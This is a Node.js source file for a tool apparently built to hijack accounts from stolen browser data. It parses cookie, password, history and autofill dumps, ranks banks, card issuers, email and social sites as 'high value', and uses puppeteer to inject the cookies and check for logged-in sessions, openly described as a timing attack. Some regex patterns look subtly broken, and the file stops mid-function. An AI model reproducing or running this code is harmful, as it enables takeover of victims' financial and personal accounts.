#!/usr/bin/env node

/**
 * Enhanced Session Checker v3.0 - Advanced Cookie Intelligence System
 * Implements T-1 timing attack methodology with comprehensive browser data cross-referencing
 *
 * Features:
 * - Recursive directory scanning for comprehensive data collection
 * - Cross-referencing with History, Passwords, Autofills, and other browser artifacts
 * - T-1 timing system for precise cookie injection
 * - Three operational modes: Discovery, Auto Testing, Manual Testing
 * - Advanced endpoint discovery and session validation
 */

const fs = require("fs");
const path = require("path");
const readline = require("readline");
const puppeteer = require("puppeteer");

// Global configuration
const CONFIG = {
  workingDir: __dirname,
  outputDirs: {
    prepared: path.join(__dirname, "prepared_cookies"),
    verified: path.join(__dirname, "verified_sessions"),
    manual: path.join(__dirname, "manual_verified"),
    analysis: path.join(__dirname, "analysis"),
    screenshots: path.join(__dirname, "screenshots")
  },
  timing: {
    t_minus_1_delay: 2000,  // 2 second preparation phase
    injection_delay: 500,   // 500ms between cookie injections
    navigation_delay: 1000, // 1 second after injection before navigation
    analysis_delay: 3000    // 3 seconds for page analysis
  },
  detection: {
    loginKeywords: [
      "sign in", "log in", "login", "password", "forgot password",
      "enter your password", "authentication", "two-factor", "2fa",
      "create account", "register", "signin", "sign up"
    ],
    loggedInKeywords: [
      "dashboard", "profile", "settings", "account", "logout", "sign out",
      "welcome", "my account", "notifications", "messages", "balance",
      "transaction", "statement", "portfolio", "investment", "inbox",
      "compose", "upload", "post", "timeline", "feed"
    ],
    highValueDomains: [
      "vancity.com", "td.com", "rbc.com", "bmo.com", "scotiabank.com",
      "americanexpress.com", "capitalone.com", "visa.com", "mastercard.com",
      "gmail.com", "google.com", "outlook.com", "hotmail.com",
      "linkedin.com", "facebook.com", "twitter.com", "x.com",
      "paypal.com", "amazon.com", "walmart.com", "costco.ca"
    ]
  }
};

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
});

function ask(question) {
  return new Promise((resolve) => rl.question(question, resolve));
}

const ASCII_HEADER = `
╔══════════════════════════════════════════════╗
║                                              ║
║  🚀  ENHANCED SESSION CHECKER v3.0           ║
║     Advanced Cookie Intelligence System      ║
║     T-1 Timing Attack Implementation         ║
║                                              ║
╚══════════════════════════════════════════════╝
`;

class CookieIntelligenceSystem {
  constructor() {
    this.discoveredData = {
      cookies: new Map(),
      history: new Map(),
      passwords: new Map(),
      autofills: new Map(),
      endpoints: new Map(),
      crossReferences: new Map()
    };
    this.stats = {
      totalFiles: 0,
      cookieFiles: 0,
      historyFiles: 0,
      passwordFiles: 0,
      autofillFiles: 0,
      validCookies: 0,
      expiredCookies: 0,
      highValueDomains: 0,
      crossReferences: 0
    };
  }

  async scanDirectoryRecursively(rootDir) {
    console.log("\n🔍 PHASE 1: Recursive Directory Scanning");
    console.log(`📂 Root Directory: ${rootDir}`);

    if (!fs.existsSync(rootDir)) {
      throw new Error(`Directory does not exist: ${rootDir}`);
    }

    await this.walkDirectory(rootDir, rootDir);
    return this.analyzeDiscoveredData();
  }

  async walkDirectory(currentDir, rootDir) {
    const entries = fs.readdirSync(currentDir, { withFileTypes: true });

    for (const entry of entries) {
      const fullPath = path.join(currentDir, entry.name);

      if (entry.isDirectory()) {
        await this.walkDirectory(fullPath, rootDir);
      } else if (entry.isFile()) {
        await this.processFile(fullPath, rootDir);
      }
    }
  }

  async processFile(filePath, rootDir) {
    const fileName = path.basename(filePath).toLowerCase();
    const relativePath = path.relative(rootDir, filePath);

    this.stats.totalFiles++;

    try {
      // Process different file types
      if (fileName.includes("cookies") && fileName.endsWith(".txt")) {
        await this.processCookieFile(filePath, relativePath);
        this.stats.cookieFiles++;
      } else if (fileName.includes("history") && fileName.endsWith(".txt")) {
        await this.processHistoryFile(filePath, relativePath);
        this.stats.historyFiles++;
      } else if (fileName.includes("password") && fileName.endsWith(".txt")) {
        await this.processPasswordFile(filePath, relativePath);
        this.stats.passwordFiles++;
      } else if (fileName.includes("autofill") && fileName.endsWith(".txt")) {
        await this.processAutofillFile(filePath, relativePath);
        this.stats.autofillFiles++;
      }
    } catch (error) {
      console.warn(`  ⚠️  Error processing ${fileName}: ${error.message}`);
    }
  }

  async processCookieFile(filePath, relativePath) {
    console.log(`  🍪 Processing cookies: ${relativePath}`);

    const content = fs.readFileSync(filePath, "utf-8");
    const lines = content.split("\n").filter(line => line.trim() && !line.startsWith("#"));

    const domainCookies = new Map();
    let validCount = 0;
    let expiredCount = 0;

    for (const line of lines) {
      try {
        const parts = line.split("\t");
        if (parts.length >= 7) {
          const domain = parts[0].replace(/^[^\w.-]/, "");
          const expiry = parseInt(parts[4], 10);
          const now = Math.floor(Date.now() / 1000);

          if (!domainCookies.has(domain)) {
            domainCookies.set(domain, []);
          }

          const isValid = (expiry > now || expiry === 0);
          if (isValid) {
            domainCookies.get(domain).push(line);
            validCount++;
          } else {
            expiredCount++;
          }
        }
      } catch (_) {
        // Skip malformed lines
      }
    }

    // Store in main data structure
    for (const [domain, cookies] of domainCookies.entries()) {
      if (!this.discoveredData.cookies.has(domain)) {
        this.discoveredData.cookies.set(domain, []);
      }
      this.discoveredData.cookies.get(domain).push({
        source: relativePath,
        cookies: cookies,
        timestamp: fs.statSync(filePath).mtime
      });
    }

    this.stats.validCookies += validCount;
    this.stats.expiredCookies += expiredCount;

    console.log(`    ✅ ${domainCookies.size} domains, ${validCount} valid cookies, ${expiredCount} expired`);
  }

  async processHistoryFile(filePath, relativePath) {
    console.log(`  📚 Processing history: ${relativePath}`);

    const content = fs.readFileSync(filePath, "utf-8");
    const lines = content.split("\n").filter(line => line.trim());

    const domainHistory = new Map();
    let urlCount = 0;

    for (const line of lines) {
      try {
        // History files typically have URL\tTITLE\tVISIT_COUNT format
        const parts = line.split("\t");
        if (parts.length >= 1) {
          const url = parts[0];
          if (url.startsWith("http")) {
            const domain = new URL(url).hostname.replace(/^www[^\w.-]/, "");

            if (!domainHistory.has(domain)) {
              domainHistory.set(domain, []);
            }

            domainHistory.get(domain).push({
              url: url,
              title: parts[1] || "",
              visitCount: parseInt(parts[2]) || 1
            });
            urlCount++;
          }
        }
      } catch (_) {
        // Skip malformed URLs
      }
    }

    // Store in main data structure
    for (const [domain, history] of domainHistory.entries()) {
      if (!this.discoveredData.history.has(domain)) {
        this.discoveredData.history.set(domain, []);
      }
      this.discoveredData.history.get(domain).push({
        source: relativePath,
        entries: history,
        timestamp: fs.statSync(filePath).mtime
      });
    }

    console.log(`    ✅ ${domainHistory.size} domains, ${urlCount} URLs`);
  }

  async processPasswordFile(filePath, relativePath) {
    console.log(`  🔐 Processing passwords: ${relativePath}`);

    const content = fs.readFileSync(filePath, "utf-8");
    const lines = content.split("\n").filter(line => line.trim());

    const domainPasswords = new Map();
    let passwordCount = 0;

    for (const line of lines) {
      try {
        // Password files typically have URL\tUSERNAME\tPASSWORD format
        const parts = line.split("\t");
        if (parts.length >= 3) {
          const url = parts[0];
          if (url.startsWith("http")) {
            const domain = new URL(url).hostname.replace(/^www[^\w.-]/, "");

            if (!domainPasswords.has(domain)) {
              domainPasswords.set(domain, []);
            }

            domainPasswords.get(domain).push({
              url: url,
              username: parts[1],
              hasPassword: parts[2].length > 0
            });
            passwordCount++;
          }
        }
      } catch (_) {
        // Skip malformed entries
      }
    }

    // Store in main data structure
    for (const [domain, passwords] of domainPasswords.entries()) {
      if (!this.discoveredData.passwords.has(domain)) {
        this.discoveredData.passwords.set(domain, []);
      }
      this.discoveredData.passwords.get(domain).push({
        source: relativePath,
        entries: passwords,
        timestamp: fs.statSync(filePath).mtime
      });
    }

    console.log(`    ✅ ${domainPasswords.size} domains, ${passwordCount} passwords`);
  }

  async processAutofillFile(filePath, relativePath) {
    console.log(`  📝 Processing autofills: ${relativePath}`);

    const content = fs.readFileSync(filePath, "utf-8");
    const lines = content.split("\n").filter(line => line.trim());

    const domainAutofills = new Map();
    let autofillCount = 0;

    for (const line of lines) {
      try {
        // Autofill files typically have FIELD_NAME\tFIELD_VALUE\tURL format
        const parts = line.split("\t");
        if (parts.length >= 3) {
          const url = parts[2];
          if (url.startsWith("http")) {
            const domain = new URL(url).hostname.replace(/^www[^\w.-]/, "");

            if (!domainAutofills.has(domain)) {
              domainAutofills.set(domain, []);
            }

            domainAutofills.get(domain).push({
              fieldName: parts[0],
              fieldValue: parts[1],
              url: url
            });
            autofillCount++;
          }
        }
      } catch (_) {
        // Skip malformed entries
      }
    }

    // Store in main data structure
    for (const [domain, autofills] of domainAutofills.entries()) {
      if (!this.discoveredData.autofills.has(domain)) {
        this.discoveredData.autofills.set(domain, []);
      }
      this.discoveredData.autofills.get(domain).push({
        source: relativePath,
        entries: autofills,
        timestamp: fs.statSync(filePath).mtime
      });
    }

    console.log(`    ✅ ${domainAutofills.size} domains, ${autofillCount} autofill entries`);
  }

  async analyzeDiscoveredData() {
    console.log("\n🔗 PHASE 2: Cross-Referencing and Analysis");

    // Get all unique domains across all data sources
    const allDomains = new Set([
      ...this.discoveredData.cookies.keys(),
      ...this.discoveredData.history.keys(),
      ...this.discoveredData.passwords.keys(),
      ...this.discoveredData.autofills.keys()
    ]);

    console.log(`📊 Found ${allDomains.size} unique domains across all data sources`);

    let processedDomains = 0;
    const crossReferencedData = new Map();

    for (const domain of allDomains) {
      processedDomains++;
      console.log(`  [${processedDomains}/${allDomains.size}] 🧬 Cross-referencing: ${domain}`);

      const domainData = {
        domain,
        cookies: this.discoveredData.cookies.get(domain) || [],
        history: this.discoveredData.history.get(domain) || [],
        passwords: this.discoveredData.passwords.get(domain) || [],
        autofills: this.discoveredData.autofills.get(domain) || [],
        analysis: {
          hasCookies: this.discoveredData.cookies.has(domain),
          hasHistory: this.discoveredData.history.has(domain),
          hasPasswords: this.discoveredData.passwords.has(domain),
          hasAutofills: this.discoveredData.autofills.has(domain),
          totalCookies: 0,
          totalHistoryEntries: 0,
          totalPasswords: 0,
          totalAutofills: 0,
          authenticatedEndpoints: [],
          highValue: CONFIG.detection.highValueDomains.includes(domain),
          crossReferenceScore: 0
        }
      };

      // Calculate totals and find authenticated endpoints
      if (domainData.cookies.length > 0) {
        domainData.analysis.totalCookies = domainData.cookies.reduce((sum, c) => sum + c.cookies.length, 0);
      }

      if (domainData.history.length > 0) {
        domainData.analysis.totalHistoryEntries = domainData.history.reduce((sum, h) => sum + h.entries.length, 0);

        // Find authenticated endpoints from history
        const authenticatedUrls = [];
        for (const historyGroup of domainData.history) {
          for (const entry of historyGroup.entries) {
            if (this.isAuthenticatedUrl(entry.url)) {
              authenticatedUrls.push({
                url: entry.url,
                title: entry.title,
                visitCount: entry.visitCount
              });
            }
          }
        }
        domainData.analysis.authenticatedEndpoints = authenticatedUrls
          .sort((a, b) => b.visitCount - a.visitCount)
          .slice(0, 5); // Top 5 most visited authenticated endpoints
      }

      if (domainData.passwords.length > 0) {
        domainData.analysis.totalPasswords = domainData.passwords.reduce((sum, p) => sum + p.entries.length, 0);
      }

      if (domainData.autofills.length > 0) {
        domainData.analysis.totalAutofills = domainData.autofills.reduce((sum, a) => sum + a.entries.length, 0);
      }

      // Calculate cross-reference score
      let score = 0;
      if (domainData.analysis.hasCookies) score += 40;
      if (domainData.analysis.hasHistory) score += 20;
      if (domainData.analysis.hasPasswords) score += 25;
      if (domainData.analysis.hasAutofills) score += 15;
      if (domainData.analysis.highValue) score += 20;
      if (domainData.analysis.authenticatedEndpoints.length > 0) score += 30;

      domainData.analysis.crossReferenceScore = Math.min(score, 100);

      crossReferencedData.set(domain, domainData);

      console.log(`    📊 Score: ${domainData.analysis.crossReferenceScore}% | Cookies: ${domainData.analysis.totalCookies} | History: ${domainData.analysis.totalHistoryEntries} | Passwords: ${domainData.analysis.totalPasswords}`);

      if (domainData.analysis.authenticatedEndpoints.length > 0) {
        console.log(`    🎯 Auth endpoints: ${domainData.analysis.authenticatedEndpoints.length}`);
      }
    }

    this.discoveredData.crossReferences = crossReferencedData;
    this.stats.crossReferences = crossReferencedData.size;
    this.stats.highValueDomains = Array.from(crossReferencedData.values())
      .filter(d => d.analysis.highValue).length;

    return crossReferencedData;
  }

  isAuthenticatedUrl(url) {
    const authPatterns = [
      "/dashboard", "/profile", "/account", "/settings", "/my-account",
      "/home", "/feed", "/inbox", "/messages", "/notifications",
      "/balance", "/transactions", "/statements", "/portfolio",
      "/admin", "/user", "/member", "/secure", "/private"
    ];

    return authPatterns.some(pattern => url.toLowerCase().includes(pattern));
  }

  async saveWorkableData() {
    console.log("\n💾 PHASE 3: Saving Workable Data");

    // Ensure output directories exist
    for (const dir of Object.values(CONFIG.outputDirs)) {
      fs.mkdirSync(dir, { recursive: true });
    }

    // Sort domains by cross-reference score (highest first)
    const sortedDomains = Array.from(this.discoveredData.crossReferences.values())
      .sort((a, b) => b.analysis.crossReferenceScore - a.analysis.crossReferenceScore);

    let savedCount = 0;
    const savedDomains = [];

    for (const domainData of sortedDomains) {
      if (domainData.analysis.hasCookies && domainData.analysis.totalCookies > 0) {
        try {
          // Combine all cookies for this domain
          const allCookies = [];
          for (const cookieGroup of domainData.cookies) {
            allCookies.push(...cookieGroup.cookies);
          }

          if (allCookies.length > 0) {
            const safeDomain = domainData.domain.replace(/[^[^\w.-][^\w.-]-]/g, "_");
            const cookieFilePath = path.join(CONFIG.outputDirs.prepared, `${safeDomain}.txt`);

            // Create header with cross-reference information
            const header = `# Netscape HTTP Cookie File
# Enhanced Session Checker v3.0 - Prepared Cookie File
# Domain: ${domainData.domain}
# Cross-Reference Score: ${domainData.analysis.crossReferenceScore}%
# Total Cookies: ${allCookies.length}
# History Entries: ${domainData.analysis.totalHistoryEntries}
# Passwords: ${domainData.analysis.totalPasswords}
# Autofills: ${domainData.analysis.totalAutofills}
# High Value Domain: ${domainData.analysis.highValue}
# Authenticated Endpoints: ${domainData.analysis.authenticatedEndpoints.length}
# Generated: ${new Date().toISOString()}
# 
# Best Endpoints:
${domainData.analysis.authenticatedEndpoints.map(ep => `# - ${ep.url} (visited ${ep.visitCount} times)`).join("\n")}
#

`;

            fs.writeFileSync(cookieFilePath, header + allCookies.join("\n") + "\n");
            savedCount++;
            savedDomains.push({
              domain: domainData.domain,
              score: domainData.analysis.crossReferenceScore,
              cookies: allCookies.length,
              endpoints: domainData.analysis.authenticatedEndpoints.length
            });

            console.log(`  ✅ ${safeDomain} | Score: ${domainData.analysis.crossReferenceScore}% | Cookies: ${allCookies.length}`);
          }
        } catch (error) {
          console.warn(`  ❌ Failed to save ${domainData.domain}: ${error.message}`);
        }
      }
    }

    // Save comprehensive analysis report
    const analysisReport = {
      timestamp: new Date().toISOString(),
      version: "3.0",
      stats: this.stats,
      topDomains: savedDomains.slice(0, 20),
      highValueDomains: sortedDomains.filter(d => d.analysis.highValue).length,
      crossReferenceComplete: true,
      recommendations: {
        immediateTest: savedDomains.filter(d => d.score >= 80).length,
        worthTesting: savedDomains.filter(d => d.score >= 60).length,
        totalPrepared: savedCount
      }
    };

    const analysisPath = path.join(CONFIG.outputDirs.analysis, "discovery_analysis.json");
    fs.writeFileSync(analysisPath, JSON.stringify(analysisReport, null, 2));

    console.log("\n🎉 DATA PREPARATION COMPLETE!");
    console.log("📊 Summary:");
    console.log(`   📂 Total files processed: ${this.stats.totalFiles}`);
    console.log(`   🍪 Cookie files: ${this.stats.cookieFiles}`);
    console.log(`   📚 History files: ${this.stats.historyFiles}`);
    console.log(`   🔐 Password files: ${this.stats.passwordFiles}`);
    console.log(`   📝 Autofill files: ${this.stats.autofillFiles}`);
    console.log(`   🌐 Total domains: ${this.stats.crossReferences}`);
    console.log(`   💎 High-value domains: ${this.stats.highValueDomains}`);
    console.log(`   ✅ Domains prepared: ${savedCount}`);
    console.log(`   📁 Analysis saved: ${analysisPath}`);

    return savedDomains;
  }
}

// T-1 Cookie Injection System
class T1CookieInjector {
  constructor() {
    this.injectionStats = {
      totalDomains: 0,
      successfulInjections: 0,
      failedInjections: 0,
      averageInjectionTime: 0
    };
  }

  async injectCookiesWithT1Timing(page, cookiePath, domain) {
    console.log(`\n⏰ T-1 TIMING PHASE: ${domain}`);

    const startTime = Date.now();

    // T-1: Preparation Phase - Read and validate cookies BEFORE any navigation
    console.log(`  🔄 T-1: Preparing cookies for ${domain}...`);
    await new Promise(resolve => setTimeout(resolve, CONFIG.timing.t_minus_1_delay));

    const cookies = await this.readAndValidateCookies(cookiePath, domain);
    if (cookies.length === 0) {
      throw new Error(`No valid cookies found for ${domain}`);
    }

    console.log(`  🍪 T-1: ${cookies.length} cookies prepared`);

    // T+0: Injection Phase - Inject cookies BEFORE first request
    console.log("  💉 T+0: Injecting cookies...");
    await page.setCookie(...cookies);
    await new Promise(resolve => setTimeout(resolve, CONFIG.timing.injection_delay));

    console.log("  ✅ T+0: Cookie injection complete");

    // T+1: Navigation Phase - Now navigate with cookies already active
    console.log("  🌐 T+1: Navigation ready (cookies active)");
    await new Promise(resolve => setTimeout(resolve, CONFIG.timing.navigation_delay));

    const injectionTime = Date.now() - startTime;
    this.injectionStats.totalDomains++;
    this.injectionStats.successfulInjections++;
    this.injectionStats.averageInjectionTime =
      (this.injectionStats.averageInjectionTime * (this.injectionStats.totalDomains - 1) + injectionTime) / this.injectionStats.totalDomains;

    console.log(`  ⚡ T+1: Injection completed in ${injectionTime}ms`);

    return {
      domain,
      cookieCount: cookies.length,
      injectionTime,
      timestamp: new Date().toISOString()
    };
  }

  async readAndValidateCookies(cookiePath, _domain) {
    const content = fs.readFileSync(cookiePath, "utf-8");
    const lines = content.split("\n").filter(line => line.trim() && !line.startsWith("#"));

    const puppeteerCookies = [];
    const now = Math.floor(Date.now() / 1000);

    for (const line of lines) {
      try {
        const parts = line.split("\t");
        if (parts.length >= 7) {
          const cookieDomain = parts[0];
          const expiry = parseInt(parts[4], 10);

          // Validate expiration
          if (expiry > now || expiry === 0) {
            puppeteerCookies.push({
              name: parts[5],
              value: parts[6],
              domain: cookieDomain,
              path: parts[2],
              expires: expiry > 0 ? expiry : undefined,
              httpOnly: parts[1] === "TRUE",
              secure: parts[3] === "TRUE"
            });
          }
        }
      } catch (_) {
        // Skip invalid cookies
      }
    }

    return puppeteerCookies;
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

// Session Analysis System
class SessionAnalyzer {
  constructor() {
    this.analysisResults = [];
  }

  async analyzeSession(page, domain, testUrl) {
    console.log(`  🔍 T+2: Analyzing session for ${domain}`);

    const startTime = Date.now();
    await new Promise(resolve => setTimeout(resolve, CONFIG.timing.analysis_delay));

    try {
      const html = await page.content();
      const title = await page.title();
      const url = page.url();

      // Advanced session detection
      const analysis = {
        domain,
        testUrl,
        actualUrl: url,
        title: title.substring(0, 100),
        redirected: url !== testUrl,
        timestamp: new Date().toISOString(),
        detection: await this.performDetectionAnalysis(html, title, url),
        pageMetrics: {
          htmlLength: html.length,
          titleLength: title.length,
          analysisTime: Date.now() - startTime
        }
      };

      console.log(`    📊 Confidence: ${analysis.detection.confidence}% | Status: ${analysis.detection.status}`);
      console.log(`    📝 Title: ${title.substring(0, 60)}...`);

      if (analysis.detection.redirected) {
        console.log(`    🔄 Redirected to: ${url}`);
      }

      this.analysisResults.push(analysis);
      return analysis;

    } catch (error) {
      console.error(`    ❌ Analysis failed: ${error.message}`);
      throw error;
    }
  }

  async performDetectionAnalysis(html, title, url) {
    const htmlLower = html.toLowerCase();
    const titleLower = title.toLowerCase();
    const urlLower = url.toLowerCase();

    let loggedInScore = 0;
    let loginScore = 0;

    // Score based on logged-in indicators
    for (const keyword of CONFIG.detection.loggedInKeywords) {
      if (htmlLower.includes(keyword) || titleLower.includes(keyword) || urlLower.includes(keyword)) {
        loggedInScore++;
      }
    }

    // Score based on login indicators (negative for logged-in status)
    for (const keyword of CONFIG.detection.loginKeywords) {
      if (htmlLower.includes(keyword) || titleLower.includes(keyword) || urlLower.includes(keyword)) {
        loginScore++;
      }
    }

    // Additional heuristics
    const hasLogoutButton = htmlLower.includes("logout") || htmlLower.includes("sign out");
    const hasWelcomeMessage = htmlLower.includes("welcome") || htmlLower.includes("hello");
    const hasPersonalInfo = htmlLower.includes("profile") || htmlLower.includes("account");
    const hasAuthenticatedContent = htmlLower.includes("dashboard") || htmlLower.includes("inbox");

    // Bonus points for strong indicators
    if (hasLogoutButton) loggedInScore += 3;
    if (hasWelcomeMessage) loggedInScore += 2;
    if (hasPersonalInfo) loggedInScore += 2;
    if (hasAuthenticatedContent) loggedInScore += 3;

    // Calculate confidence (0-100%)
    const totalIndicators = loggedInScore + loginScore + 0.1; // Avoid division by zero
    const confidence = Math.round((loggedInScore / totalIndicators) * 100);

    const isLoggedIn = confidence >= 60; // Higher threshold for better accuracy

    return {
      loggedInScore,
      loginScore,
      confidence,
      isLoggedIn,
      status: isLoggedIn ? "LOGGED_IN" : "NOT_LOGGED_IN",
      indicators: {
        hasLogoutButton,
        hasWelcomeMessage,
        hasPersonalInfo,
        hasAuthenticatedContent
      }
    };
  }
}

// Main Application Class
class EnhancedSessionChecker {
  constructor() {
    this.cookieIntelligence = new CookieIntelligenceSystem();
    this.t1Injector = new T1CookieInjector();
    this.sessionAnalyzer = new SessionAnalyzer();
  }

  async viewScanHistory() {
    console.log("\n📚 MODE 4: SCAN HISTORY & STATISTICS");
    console.log("View previous scans and manage duplicate tracking.");

    const scanHistoryPath = path.join(CONFIG.outputDirs.analysis, "scan_history.json");
    const duplicateTrackingPath = path.join(CONFIG.outputDirs.analysis, "scanned_directories.json");

    try {
      // Load scan history
      if (!fs.existsSync(scanHistoryPath)) {
        console.log("\n❌ No scan history found. Run Mode 1 (Discovery) first.");
        rl.close();
        return;
      }

      const scanHistory = JSON.parse(fs.readFileSync(scanHistoryPath, "utf-8"));
      const scannedDirectories = fs.existsSync(duplicateTrackingPath)
        ? JSON.parse(fs.readFileSync(duplicateTrackingPath, "utf-8"))
        : {};

      console.log("\n📊 SCAN HISTORY OVERVIEW:");
      console.log(`   📁 Total directories scanned: ${Object.keys(scannedDirectories).length}`);
      console.log(`   🔄 Total scans performed: ${scanHistory.length}`);
      console.log(`   📈 History file: ${scanHistoryPath}`);
      console.log(`   🗂️  Tracking file: ${duplicateTrackingPath}`);

      if (scanHistory.length === 0) {
        console.log("\n❌ No scans in history.");
        rl.close();
        return;
      }

      // Show recent scans
      console.log("\n🕐 RECENT SCANS (Last 10):");
      const recentScans = scanHistory.slice(-10).reverse();
      recentScans.forEach((scan, index) => {
        const date = new Date(scan.lastScanned).toLocaleString();
        const duration = scan.scanDuration ? `${(scan.scanDuration / 1000).toFixed(1)}s` : "Unknown";
        console.log(`   ${index + 1}. ${scan.directory}`);
        console.log(`      🕐 ${date} | ⏱️  ${duration} | 🎯 ${scan.domainsFound} domains | 🍪 ${scan.cookiesFound} cookies`);
      });

      // Show directory tracking
      console.log("\n📁 TRACKED DIRECTORIES:");
      const sortedDirs = Object.entries(scannedDirectories)
        .sort((a, b) => new Date(b[1].lastScanned) - new Date(a[1].lastScanned));

      sortedDirs.slice(0, 15).forEach(([dir, info], index) => {
        const date = new Date(info.lastScanned).toLocaleDateString();
        console.log(`   ${index + 1}. ${dir}`);
        console.log(`      📅 ${date} | 🎯 ${info.domainsFound} domains | 🍪 ${info.cookiesFound} cookies`);
      });

      if (sortedDirs.length > 15) {
        console.log(`   ... and ${sortedDirs.length - 15} more directories`);
      }

      // Statistics
      const totalDomains = scanHistory.reduce((sum, scan) => sum + (scan.domainsFound || 0), 0);
      const totalCookies = scanHistory.reduce((sum, scan) => sum + (scan.cookiesFound || 0), 0);
      const averageDomains = totalDomains / scanHistory.length;
      const averageCookies = totalCookies / scanHistory.length;

      console.log("\n📈 OVERALL STATISTICS:");
      console.log(`   🎯 Total domains discovered: ${totalDomains}`);
      console.log(`   🍪 Total cookies found: ${totalCookies}`);
      console.log(`   📊 Average domains per scan: ${averageDomains.toFixed(1)}`);
      console.log(`   📊 Average cookies per scan: ${averageCookies.toFixed(1)}`);

      // Management options
      const choice = await ask(`\n🛠️  Management Options:
1) Clear scan history
2) Remove specific directory from tracking  
3) Export history to JSON
4) View detailed scan report
5) Return to main menu

Choice (1-5): `);

      switch (choice.trim()) {
      case "1": {
        const confirmClear = await ask("⚠️  Clear all scan history? This cannot be undone (y/N): ");
        if (confirmClear.toLowerCase().startsWith("y")) {
          fs.writeFileSync(scanHistoryPath, "[]");
          fs.writeFileSync(duplicateTrackingPath, "{}");
          console.log("✅ Scan history cleared");
        } else {
          console.log("❌ Clear cancelled");
        }
        break;
      }

      case "2": {
        const dirToRemove = await ask("Enter directory path to remove from tracking: ");
        if (scannedDirectories[dirToRemove]) {
          delete scannedDirectories[dirToRemove];
          fs.writeFileSync(duplicateTrackingPath, JSON.stringify(scannedDirectories, null, 2));
          console.log(`✅ Directory removed from tracking: ${dirToRemove}`);
        } else {
          console.log("❌ Directory not found in tracking");
        }
        break;
      }

      case "3": {
        const exportPath = path.join(CONFIG.outputDirs.analysis, `scan_history_export_${Date.now()}.json`);
        const exportData = {
          exportDate: new Date().toISOString(),
          scanHistory,
          scannedDirectories,
          statistics: {
            totalScans: scanHistory.length,
            totalDirectories: Object.keys(scannedDirectories).length,
            totalDomains,
            totalCookies,
            averageDomains: averageDomains.toFixed(2),
            averageCookies: averageCookies.toFixed(2)
          }
        };
        fs.writeFileSync(exportPath, JSON.stringify(exportData, null, 2));
        console.log(`✅ History exported to: ${exportPath}`);
        break;
      }

      case "4":
        if (scanHistory.length > 0) {
          const latestScan = scanHistory[scanHistory.length - 1];
          console.log("\n📋 LATEST SCAN DETAILED REPORT:");
          console.log(`   📁 Directory: ${latestScan.directory}`);
          console.log(`   🕐 Date: ${new Date(latestScan.lastScanned).toLocaleString()}`);
          console.log(`   ⏱️  Duration: ${latestScan.scanDuration ? (latestScan.scanDuration / 1000).toFixed(2) + "s" : "Unknown"}`);
          console.log(`   🎯 Domains: ${latestScan.domainsFound}`);
          console.log(`   🍪 Cookies: ${latestScan.cookiesFound}`);
          console.log(`   📊 Analysis file: ${latestScan.analysisFile}`);
          console.log(`   🔧 Version: ${latestScan.version || "1.0"}`);

          if (fs.existsSync(latestScan.analysisFile)) {
            try {
              const analysis = JSON.parse(fs.readFileSync(latestScan.analysisFile, "utf-8"));
              console.log("\n   🏆 Top 5 domains from analysis:");
              if (analysis.topDomains) {
                analysis.topDomains.slice(0, 5).forEach((domain, i) => {
                  console.log(`      ${i+1}. ${domain.domain} (${domain.score}% score, ${domain.cookies} cookies)`);
                });
              }
            } catch (_) {
              console.log("   ❌ Could not load analysis details: parsing error");
            }
          }
        }
        break;

      case "5":
      default:
        console.log("↩️  Returning to main menu...");
        break;
      }

    } catch (error) {
      console.error(`💥 Error viewing scan history: ${error.message}`);
    }

    rl.close();
  }

  async runDiscoveryMode() {
    console.log("\n🔍 MODE 1: COOKIE DISCOVERY & INTELLIGENCE");
    console.log("This mode will recursively scan directories and cross-reference all browser data.");

    // Check for previous scans and tracking
    const scanHistoryPath = path.join(CONFIG.outputDirs.analysis, "scan_history.json");
    const duplicateTrackingPath = path.join(CONFIG.outputDirs.analysis, "scanned_directories.json");

    let scanHistory = [];
    let scannedDirectories = {};

    // Load existing scan history
    if (fs.existsSync(scanHistoryPath)) {
      try {
        scanHistory = JSON.parse(fs.readFileSync(scanHistoryPath, "utf-8"));
        console.log(`📚 Found ${scanHistory.length} previous scans in history`);
      } catch (_) {
        console.log("⚠️  Could not load scan history: parsing error");
      }
    }

    // Load scanned directories tracking
    if (fs.existsSync(duplicateTrackingPath)) {
      try {
        scannedDirectories = JSON.parse(fs.readFileSync(duplicateTrackingPath, "utf-8"));
        const trackedCount = Object.keys(scannedDirectories).length;
        console.log(`📁 Tracking ${trackedCount} previously scanned directories`);
      } catch (_) {
        console.log("⚠️  Could not load directory tracking: parsing error");
      }
    }

    // Get target directory from user with duplicate detection
    let targetDir;
    while (true) {
      const input = await ask("\nEnter the root directory to scan recursively: ");
      if (!input) {
        console.log("❌ Please enter a directory path.");
        continue;
      }

      if (!fs.existsSync(input)) {
        console.log("❌ Directory does not exist. Please try again.");
        continue;
      }

      const normalizedPath = path.resolve(input);
      targetDir = normalizedPath;

      // Check if this directory has been scanned before
      if (scannedDirectories[normalizedPath]) {
        const previousScan = scannedDirectories[normalizedPath];
        console.log("\n⚠️  DUPLICATE DETECTION:");
        console.log(`   📁 Directory: ${normalizedPath}`);
        console.log(`   🕐 Previously scanned: ${previousScan.lastScanned}`);
        console.log(`   🍪 Found: ${previousScan.domainsFound} domains, ${previousScan.cookiesFound} cookies`);
        console.log(`   📊 Analysis: ${previousScan.analysisFile}`);

        const rescanChoice = await ask("\n   🤔 This directory was already scanned. Re-scan anyway? (y/n/view): ");

        if (rescanChoice.toLowerCase().startsWith("view") || rescanChoice.toLowerCase().startsWith("v")) {
          // Show previous results
          console.log("\n📋 PREVIOUS SCAN RESULTS:");
          if (fs.existsSync(previousScan.analysisFile)) {
            try {
              const previousResults = JSON.parse(fs.readFileSync(previousScan.analysisFile, "utf-8"));
              console.log(`   📊 Total domains: ${previousResults.summary?.totalDomains || 0}`);
              console.log(`   🍪 Total cookies: ${previousResults.summary?.totalCookies || 0}`);
              console.log(`   🎯 High-value domains: ${previousResults.summary?.highValueDomains || 0}`);

              if (previousResults.topDomains) {
                console.log("\n   🏆 Top 5 domains from previous scan:");
                previousResults.topDomains.slice(0, 5).forEach((domain, i) => {
                  console.log(`      ${i+1}. ${domain.domain} (${domain.score}% score, ${domain.cookies} cookies)`);
                });
              }
            } catch (_) {
              console.log("   ❌ Could not load previous results: parsing error");
            }
          }

          const afterViewChoice = await ask("\n   Continue with re-scan? (y/n): ");
          if (!afterViewChoice.toLowerCase().startsWith("y")) {
            console.log("   ⏭️  Skipping re-scan. Use Mode 2 to test existing prepared cookies.");
            rl.close();
            return;
          }
